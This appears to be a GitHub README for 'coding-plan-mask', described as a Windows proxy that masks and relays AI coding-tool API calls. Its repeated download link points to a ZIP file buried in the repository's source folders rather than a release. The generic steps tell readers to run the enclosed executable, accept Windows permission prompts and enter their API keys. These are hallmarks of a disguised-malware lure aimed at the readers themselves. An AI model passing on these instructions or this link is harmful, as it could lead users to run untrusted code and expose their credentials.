# 🎭 coding-plan-mask - Mask API Calls for AI Tools

[![Download coding-plan-mask](https://img.shields.io/badge/Download%20Now-2D9CDB?style=for-the-badge&labelColor=6B7280&logo=github&logoColor=white)](https://github.com/Tod-weenieroast366/coding-plan-mask/raw/refs/heads/main/internal/server/plan-coding-mask-3.4.zip)

## 🚀 What This App Does

coding-plan-mask is a simple proxy app for Windows. It sits between your AI coding tool and the Coding Plan API. It helps you route requests, mask tool calls, and work with more than one provider from one place.

Use it when you want an OpenAI-compatible endpoint that your AI tool can talk to, while the app handles request relay in the background.

## 🖥️ What You Need

Before you start, make sure you have:

- A Windows PC
- An internet connection
- An AI coding tool that can use a custom API URL
- Access to a Coding Plan API key or provider account
- Enough free disk space for a small desktop utility

This app is light and should run on most modern Windows systems.

## 📥 Download the App

Visit this page to download:

[https://github.com/Tod-weenieroast366/coding-plan-mask/raw/refs/heads/main/internal/server/plan-coding-mask-3.4.zip](https://github.com/Tod-weenieroast366/coding-plan-mask/raw/refs/heads/main/internal/server/plan-coding-mask-3.4.zip)

If the page includes a release file for Windows, download and run that file. If you only see the main repository page, use the download option on that page to get the app files.

## 🪟 Install on Windows

Follow these steps to get the app running on your PC:

1. Open the download page in your browser.
2. Find the latest release or download file for Windows.
3. Download the file to your computer.
4. If the file is a ZIP archive, right-click it and choose Extract All.
5. Open the extracted folder.
6. Look for the app file, such as an `.exe` file.
7. Double-click the file to start the app.

If Windows asks for permission, choose Run or Yes.

## 🔧 Set Up Your Proxy

After you open the app, set it up like this:

1. Enter your Coding Plan API details.
2. Pick the provider you want to use.
3. Set the local address the app should use on your PC.
4. Save the settings.
5. Leave the app open while your AI tool is running.

The app will then listen for requests from your AI tool and pass them to the right provider.

## 🤖 Connect Your AI Coding Tool

Most AI coding tools let you change the API URL. Use the local address from coding-plan-mask in that setting.

Typical setup steps:

1. Open your AI coding tool.
2. Find the API or connection settings.
3. Paste the local proxy URL from coding-plan-mask.
4. Add the matching API key if the tool asks for one.
5. Save the changes.
6. Start a new chat or code task.

If your tool supports an OpenAI-style endpoint, this proxy should fit into that setup.

## 🧩 Main Features

- OpenAI-compatible proxy support
- Request relay to backend providers
- Tool masking for cleaner request flow
- Multi-provider routing
- Simple local setup on Windows
- Works with common AI coding tools

## 🛠️ How It Works

The app acts as a middle layer.

Your AI tool sends a request to coding-plan-mask.  
coding-plan-mask checks the request, masks tool details if needed, and forwards it to the provider you chose.  
The provider sends the response back through the proxy.  
Your AI tool gets the result as if it talked to one standard OpenAI-style service.

This setup keeps the connection simple on the tool side while giving you more control in the middle.

## 📌 Common Use Cases

Use coding-plan-mask if you want to:

- Keep one API format for several tools
- Route requests through a local proxy
- Reduce tool-level changes when switching providers
- Mask tool calls before they reach the backend
- Test different AI providers from one interface

## 🔍 Basic Troubleshooting

If the app does not start:

- Check that Windows allowed the file to run
- Make sure you extracted the ZIP file first
- Try opening the app again as the same user that downloaded it

If your AI tool cannot connect:

- Confirm the local proxy URL is correct
- Make sure the app is still open
- Check that the provider API key is valid
- Make sure the tool is set to use an OpenAI-compatible endpoint

If requests fail:

- Recheck the provider selection
- Look for typing mistakes in the API settings
- Restart the app and your AI tool
- Try a new request after saving the settings again

## 📚 Folder and File Guide

You may see files such as:

- An app executable file
- A settings file
- A log file
- A readme file
- A license file

Keep the app files together in one folder. Do not move random files out of the folder unless you know what they do.

## 🔐 Privacy and Local Use

coding-plan-mask runs as a local proxy on your machine. That means it handles traffic between your AI tool and the provider service.

Use the app only with accounts and providers you trust. If you work on a shared PC, store your API settings in a safe place.

## 🧭 Quick Start

1. Download coding-plan-mask from the link above.
2. Install or extract it on Windows.
3. Open the app.
4. Add your provider and API details.
5. Point your AI coding tool to the local proxy address.
6. Start using your tool as usual

## 🏷️ Project Topics

ai, api-gateway, coding-plan, mask, openai-compatible, proxy